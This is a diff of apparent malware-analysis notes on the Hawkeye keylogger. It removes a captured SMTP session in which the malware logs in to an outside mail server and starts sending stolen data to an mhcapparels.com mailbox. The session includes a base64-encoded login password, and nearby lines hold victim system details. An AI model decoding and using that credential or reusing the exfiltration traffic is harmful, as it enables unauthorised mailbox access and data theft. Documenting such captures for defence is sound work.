@@ -38,26 +38,6 @@ el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br>IP: 18=
 
 #### Hawkeye keyogger
 ~~~
-220 and/or bulk e-mail.
-EHLO User-PC
-250-europa.websitewelcome.com Hello User-PC [89.187.165.47]
-250-SIZE 52428800
-250-8BITMIME
-250-PIPELINING
-250-AUTH PLAIN LOGIN
-250-STARTTLS
-250 HELP
-AUTH login 
-334 UGFzc3dvcmQ6
-I01vc2hhcnJvZiMzMjFA
-235 Authentication succeeded
-MAIL FROM:<mosharrof@mhcapparels.com>
-250 OK
-RCPT TO:<mosharrof@mhcapparels.com>
-250 Accepted
-DATA
-354 Enter message, ending with "." on a line by itself
-MIME-Version: 1.0
 From: mosharrof@mhcapparels.com
 To: mosharrof@mhcapparels.com
 Date: 9 Oct 2019 01:57:35 +0100
